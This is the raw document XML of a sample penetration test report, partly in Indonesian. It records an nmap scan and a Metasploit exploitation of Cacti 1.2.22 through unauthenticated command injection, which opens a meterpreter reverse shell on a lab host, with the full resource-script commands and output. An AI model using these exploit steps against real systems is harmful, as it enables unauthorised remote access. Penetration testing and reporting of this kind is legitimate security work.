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896573"/>
            <wp:docPr id="1" name="Picture 1"/>
            <wp:cNvGraphicFramePr>
              <a:graphicFrameLocks noChangeAspect="1"/>
            </wp:cNvGraphicFramePr>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="ugm.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1828800" cy="1896573"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect"/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Sample Penetration Test Report Example Company</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        Company: Penelitian Damas 2024</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Authors: N.R. Rosyid, Y. M. Saputra, Anni K. Fauziyah, Yoan Navie Ananda</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Date: 25 February 2025</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7.94SVN scan initiated Tue Feb 25 14:14:35 2025 as: nmap -sV -sC -Pn --script http-title -oN nmap_results.txt 10.33.102.225</w:t>
        <w:br/>
        <w:t>Nmap scan report for 10.33.102.225</w:t>
        <w:br/>
        <w:t>Host is up (0.0013s latency).</w:t>
        <w:br/>
        <w:t>Not shown: 997 closed tcp ports (conn-refused)</w:t>
        <w:br/>
        <w:t>PORT     STATE SERVICE VERSION</w:t>
        <w:br/>
        <w:t>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)</w:t>
        <w:br/>
        <w:t>80/tcp   open  http    Apache httpd 2.4.54 ((Debian))</w:t>
        <w:br/>
        <w:t>|_http-title: Login to Cacti</w:t>
        <w:br/>
        <w:t>|_http-server-header: Apache/2.4.54 (Debian)</w:t>
        <w:br/>
        <w:t>3306/tcp open  mysql   MySQL 5.5.23</w:t>
        <w:br/>
        <w:t>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</w:t>
        <w:br/>
        <w:br/>
        <w:t>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</w:t>
        <w:br/>
        <w:t># Nmap done at Tue Feb 25 14:14:43 2025 -- 1 IP address (1 host up) scanned in 7.92 seconds</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>Hasil pemindaian menunjukkan bahwa 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scanning result of target 10.33.102.225 </w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] Using configured payload linux/x86/meterpreter/reverse_tcp</w:t>
        <w:br/>
        <w:t>RHOSTS =&gt; 10.33.102.225</w:t>
        <w:br/>
        <w:t>RPORT =&gt; 80</w:t>
        <w:br/>
        <w:t>[*] 10.33.102.225:80 - The target appears to be vulnerable. The target is Cacti version 1.2.22</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Metasploit melakukan pemindaian kerentanan pada target sistem dan berhasil mengidentifikasi bahwa alamat IP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10.33.102.225</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>[*] Processing exploitResource.rc for ERB directives.</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; use exploit/linux/http/cacti_unauthenticated_cmd_injection</w:t>
        <w:br/>
        <w:t>[*] Using configured payload linux/x86/meterpreter/reverse_tcp</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; set RHOSTS 10.33.102.225</w:t>
        <w:br/>
        <w:t>RHOSTS =&gt; 10.33.102.225</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; set RPORT 80</w:t>
        <w:br/>
        <w:t>RPORT =&gt; 80</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; set LHOST 10.33.102.151</w:t>
        <w:br/>
        <w:t>LHOST =&gt; 10.33.102.151</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; exploit -j</w:t>
        <w:br/>
        <w:t>[*] Exploit running as background job 0.</w:t>
        <w:br/>
        <w:t>[*] Exploit completed, but no session was created.</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; sleep 20</w:t>
        <w:br/>
        <w:t xml:space="preserve">[*] Started reverse TCP handler on 10.33.102.151:4444 </w:t>
        <w:br/>
        <w:t>[*] Running automatic check ("set AutoCheck false" to disable)</w:t>
        <w:br/>
        <w:t>[*] Sending stage (1017704 bytes) to 10.33.102.225</w:t>
        <w:br/>
        <w:t>[+] The target appears to be vulnerable. The target is Cacti version 1.2.22</w:t>
        <w:br/>
        <w:t>[*] Trying to bruteforce an exploitable host_id and local_data_id by trying up to 500 combinations</w:t>
        <w:br/>
        <w:t>[*] Enumerating local_data_id values for host_id 1</w:t>
        <w:br/>
        <w:t>[*] Meterpreter session 1 opened (10.33.102.151:4444 -&gt; 10.33.102.225:52798) at 2025-02-25 14:16:16 +0700</w:t>
        <w:br/>
        <w:t>[+] Found exploitable local_data_id 15 for host_id 1</w:t>
        <w:br/>
        <w:t>[*] Command Stager progress - 100.00% done (1118/1118 bytes)</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; sessions -i</w:t>
        <w:br/>
        <w:br/>
        <w:t>Active sessions</w:t>
        <w:br/>
        <w:t>===============</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  Id  Name  Type                   Information            Connection</w:t>
        <w:br/>
        <w:t xml:space="preserve">  --  ----  ----                   -----------            ----------</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1         meterpreter x86/linux  www-data @ 172.24.0.3  10.33.102.151:4444 -&gt; 10.33.102.225:527</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                                          98 (::1)</w:t>
        <w:br/>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; sessions -c 'ls -la' -i 1</w:t>
        <w:br/>
        <w:t>[*] Running 'ls -la' on meterpreter session 1 (::1)</w:t>
        <w:br/>
        <w:t>total 2792</w:t>
        <w:br/>
        <w:t>drwxrwxrwx 1 www-data www-data   4096 Jun  3  2024 .</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 root     root       4096 Nov 15  2022 ..</w:t>
        <w:br/>
        <w:t>-rw-rw-r-- 1 www-data www-data    577 Aug 14  2022 .mdl_style.rb</w:t>
        <w:br/>
        <w:t>-rw-rw-r-- 1 www-data www-data     60 Aug 14  2022 .mdlrc</w:t>
        <w:br/>
        <w:t>-rw------- 1 www-data www-data   1024 Jun  3  2024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2024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2024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(exploitResource.rc)&gt; sleep 10</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; exit</w:t>
        <w:br/>
        <w:t>[*] You have active sessions open, to exit anyway type "exit -y"</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt;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